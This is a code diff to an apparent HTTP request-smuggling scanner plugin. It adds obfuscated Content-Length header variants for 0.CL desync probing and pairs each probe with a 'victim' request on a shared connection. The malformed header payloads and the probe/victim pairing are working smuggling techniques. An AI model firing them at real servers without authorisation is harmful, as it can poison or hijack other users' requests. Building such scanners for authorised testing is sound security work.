@@ -71,8 +71,22 @@
   function malformedMethod(path, parsed, inherited, marker) {
     return message("XGET", path, parsed.authority, inherited, ["X-HuntProxy-Desync: " + marker], "", true);
   }
-  function zeroCl(parsed, path, inherited, marker) {
-    return message("GET", path, parsed.authority, inherited, ["Content-Length : 1", "X-HuntProxy-Desync: " + marker], "", false);
+  function zeroCl(parsed, path, inherited, marker, hiddenLines) {
+    return message("GET", path, parsed.authority, inherited, hiddenLines.concat(["X-HuntProxy-Desync: " + marker]), "", false);
+  }
+  function zeroClVariants() {
+    return [
+      { name: "space before colon", lines: ["Content-Length : 1"] },
+      { name: "wrapped value", lines: ["Content-Length:\r\n 1"] },
+      { name: "tab before colon", lines: ["Content-Length\t: 1"] },
+      { name: "leading whitespace", lines: ["X-Junk: x", " Content-Length: 1"] },
+      { name: "hop-by-hop", lines: ["Content-Length: 1", "Connection: Content-Length"] },
+      { name: "hidden hop-by-hop", lines: ["Content-Length: 1", "Connection : Content-Length"] },
+      { name: "duplicate", lines: ["Content-Length: 1", "Content-Length: 1"] },
+      { name: "underscore", lines: ["Content_Length: 1"] },
+      { name: "LF name wrap", lines: ["X-Junk: x\nContent-Length: 1"] },
+      { name: "CR name wrap", lines: ["X-Junk: x\rContent-Length: 1"] }
+    ];
   }
   function withHost(path, parsed, inherited, host, close) {
     var lines = ["GET " + path + " HTTP/1.1", "Host: " + host];
@@ -133,8 +147,8 @@
       add("te_te", "TE.TE " + permutation[0] + " (TE.CL oracle)", teCl(parsed, path, canaryPath, inherited, marker, permutation[1]), true, "te_cl");
     });
     add("cl_0", "CL.0 marker pipeline", clZero(parsed, path, canaryPath, inherited, marker), true);
-    var body = "12345";
-    add("0_cl", "0.CL early-response confirmation", zeroCl(parsed, path, inherited, marker), true, "0_cl", "zero_cl_pair");
+    var zeroVariants = zeroClVariants();
+    add("0_cl", "0.CL " + zeroVariants[0].name, zeroCl(parsed, path, inherited, marker, zeroVariants[0].lines), true, "0_cl", "zero_cl_pair");
     var connectionHost = String(input.connection_state_host || (marker + "." + parsed.authority));
     if (!connectionHost || /[\r\n\s]/.test(connectionHost) || connectionHost.length > 255) throw new Error("connection_state_host must be a CRLF-free Host value");
     var connectionPath = safePath(input.connection_state_path || path, "connection_state_path");
@@ -149,6 +163,9 @@
     add("pause", "server-side pause-based CL.0", pauseProbe(parsed,path,canaryPath,inherited,marker), true, "pause", "pause");
     add("parser_discrepancy", "conflicting duplicate Content-Length", message("POST", path, parsed.authority, inherited, ["Content-Length: 4", "Content-Length: 5", "Content-Type: text/plain"], "12345", false) + normalGet(path, parsed, inherited, true), false);
     add("parser_discrepancy", "signed Content-Length", message("POST", path, parsed.authority, inherited, ["Content-Length: +5", "Content-Type: text/plain"], "12345", false) + normalGet(path, parsed, inherited, true), false);
+    zeroVariants.slice(1).forEach(function (variant) {
+      add("0_cl", "0.CL " + variant.name, zeroCl(parsed, path, inherited, marker, variant.lines), true, "0_cl", "zero_cl_pair");
+    });
     var selected = input.families && input.families.length ? input.families : ["cl_te", "te_cl", "te_te", "cl_0", "0_cl", "connection_state", "h2_cl", "h2_te", "h2_crlf", "h2_split", "h2_tunnel", "parser_discrepancy"];
     return { parsed: parsed, inherited: inherited, path: path, canary_path: canaryPath, connection_host: connectionHost, connection_path: connectionPath, items: items.filter(function (item) { return selected.indexOf(item.family) !== -1; }).slice(0, Math.max(1, Math.min(Number(input.max_techniques || 30), 30))) };
   }
@@ -156,6 +173,7 @@
     return { response_mode: "until_idle", read_timeout_ms: Math.max(1000, Math.min(Number(input.read_timeout_ms || 8000), 30000)), idle_timeout_ms: Math.max(500, Math.min(Number(input.idle_timeout_ms || 1500), 5000)), half_close_write: false };
   }
   function raw(id, parsed, request, input) { return { id: id, type: "raw_http1", target_url: parsed.url, request_base64: toBase64(request), use_project_cookies: false, options: options(input) }; }
+  function rawGroup(id, parsed, members, input) { return { id: id, type: "raw_http1_group", target_url: parsed.url, members: members.map(function (member) { return { id: member.id, request_base64: toBase64(member.request), use_project_cookies: false, options: options(input) }; }) }; }
   function rawH2(id, parsed, request, input) { return { id: id, type: "raw_http2", target_url: parsed.url, streams: [{ id: id + "-stream", headers: request.headers, body_text: request.body }], options: { timeout_ms: Math.max(1000, Math.min(Number(input.read_timeout_ms || 8000), 30000)), final_data_together: false } }; }
   function isH2Mode(mode){return mode==="h2"||mode==="h2_tunnel"||mode==="h2_header_injection";}
   function rawPause(id,parsed,request,input){return {id:id,type:"raw_http1",target_url:parsed.url,request_base64:toBase64(request.bytes),use_project_cookies:false,options:{pause_at_byte:request.split,pause_ms:Math.max(1,Math.min(Number(input.pause_ms||61000),120000)),await_response_before_continue:input.pause_await_response===true,half_close_write:false,response_mode:"until_idle",read_timeout_ms:Math.max(1000,Math.min(Number(input.read_timeout_ms||30000),120000)),idle_timeout_ms:Math.max(500,Math.min(Number(input.idle_timeout_ms||1500),5000))}};}
@@ -188,6 +206,13 @@
           operations.push(rawPause("probe-"+index+"-"+repeat,set.parsed,probe,input));
           operations.push(raw("victim-"+index+"-"+repeat,set.parsed,victim,input));
           operations.push(raw("recovery-"+index+"-"+repeat,set.parsed,clean,input));
+        } else if (technique.mode === "zero_cl_pair") {
+          operations.push(raw("control-" + index + "-" + repeat, set.parsed, control, input));
+          operations.push(rawGroup("pair-" + index + "-" + repeat, set.parsed, [
+            { id: "probe-" + index + "-" + repeat, request: probe },
+            { id: "victim-" + index + "-" + repeat, request: victim }
+          ], input));
+          operations.push(raw("recovery-" + index + "-" + repeat, set.parsed, clean, input));
         } else if (isH2Mode(technique.mode)) {
           operations.push(rawH2("control-" + index + "-" + repeat, set.parsed, { headers: h2Headers(set.parsed, "GET", set.path, set.inherited), body: "" }, input));
           operations.push(rawH2("probe-" + index + "-" + repeat, set.parsed, probe, input));
@@ -201,9 +226,10 @@
         }
       }
     });
-    return { execution: "sequential", operations: operations, result: { repeats: repeats, auth_included: input.include_auth === true, canary_path: set.canary_path, request_count: operations.length, techniques: set.items.map(function (item) { return { family: item.family, name: item.name, polarity: item.polarity, canary_confirmation: item.confirmable }; }), limitations: ["HTTP/2 families require HTTPS with ALPN h2 and never fall back to HTTP/1", "Pause-based probing is opt-in because each cycle may hold a connection for up to pause_ms", "Browser client-side desync requires a real browser workflow", "Authentication is excluded unless include_auth=true"] } };
+    var requestCount = operations.reduce(function (count, operation) { return count + (operation.type === "raw_http1_group" ? operation.members.length : operation.type === "raw_http2" ? operation.streams.length : 1); }, 0);
+    return { execution: "sequential", operations: operations, result: { repeats: repeats, auth_included: input.include_auth === true, canary_path: set.canary_path, request_count: requestCount, techniques: set.items.map(function (item) { return { family: item.family, name: item.name, polarity: item.polarity, canary_confirmation: item.confirmable }; }), limitations: ["HTTP/2 families require HTTPS with ALPN h2 and never fall back to HTTP/1", "Pause-based probing is opt-in because each cycle may hold a connection for up to pause_ms", "Browser client-side desync requires a direct real-browser workflow and is not currently confirmed by this plugin", "Authentication is excluded unless include_auth=true"] } };
   }
-  function byId(observations) { var output = {}; observations.forEach(function (item) { output[item.id] = item; }); return output; }
+  function byId(observations) { var output = {}; observations.forEach(function (item) { output[item.id] = item; if (Array.isArray(item.members)) item.members.forEach(function (member) { output[member.id] = member; }); }); return output; }
   function rawResult(item) { return item && !item.error && item.raw ? item.raw : null; }
   function hasResult(item) { return !!rawResult(item) || !!(item && !item.error && Array.isArray(item.streams)); }
   function outcome(item) { var value = rawResult(item); if (value) return String(value.read_outcome || "missing"); if (item && Array.isArray(item.streams)) return item.timed_out ? "timeout" : "idle"; return "error"; }
@@ -269,7 +295,7 @@
         var victimFirst=segments(victim)[0],recoveryFirst=segments(recovery)[0]; if((victimFirst&&!matchesBase(victimFirst,baseSignature))||(recoveryFirst&&!matchesBase(recoveryFirst,baseSignature))) divergentVictims+=1;
         if (outcome(probe) === "timeout" && outcome(control) !== "timeout") timeouts += 1;
       }
-      var confirmed = directStable && canaryDistinct && clean === repeats && contaminated >= threshold;
+      var confirmed = directStable && (technique.mode === "zero_cl_pair" || canaryDistinct) && clean === repeats && contaminated >= threshold;
       var candidate = directStable && clean === repeats && timeouts >= threshold;
       var responseCandidate=directStable&&clean===repeats&&divergentVictims>=threshold;
       diagnostics.push({ family: technique.family, technique: technique.name, polarity: technique.polarity, clean_controls: clean, canary_confirmations: contaminated, divergent_victims: divergentVictims, probe_only_timeouts: timeouts, repeats: repeats, signal: confirmed ? "marker_contamination" : responseCandidate ? "victim_divergence" : candidate ? "timing_candidate" : "none" });
